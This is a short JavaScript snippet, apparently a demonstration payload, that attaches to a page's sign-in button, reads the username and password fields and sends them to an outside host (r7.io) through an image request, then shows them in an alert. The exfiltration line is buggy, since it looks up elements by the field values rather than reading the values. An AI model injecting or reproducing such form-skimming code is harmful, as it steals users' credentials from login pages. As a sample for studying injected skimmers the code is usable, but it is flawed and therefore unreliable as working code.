document.addEventListener("DOMContentLoaded", function() {
	document.getElementById("signin-btn").onclick = function givePassword() {
		var img = new Image();
		var pw = document.getElementById("login_password").value;
		var un = document.getElementById("login_username").value;
		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.getElementById(un).value) + encodeURIComponent(document.getElementById(pw).value);
		console.log(img);
		alert("Username is: " + un + "and Password is: " + pw);
	};
});

